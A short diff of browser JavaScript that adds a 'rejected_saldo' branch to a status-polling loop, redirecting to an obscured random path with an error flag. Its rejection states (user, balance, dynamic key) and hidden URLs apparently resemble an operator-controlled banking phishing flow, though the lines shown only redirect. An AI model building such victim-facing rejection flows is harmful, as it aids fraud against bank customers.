@@ -102,6 +102,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 } else if (statusData.status === 'rejected_user') {
                     clearInterval(pollInterval);
                     window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=user';
+                } else if (statusData.status === 'rejected_saldo') {
+                    clearInterval(pollInterval);
+                    window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=saldo';
                 } else if (statusData.status === 'rejected_dynamic') {
                     clearInterval(pollInterval);
                     window.location.href = '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj?error=dynamic';
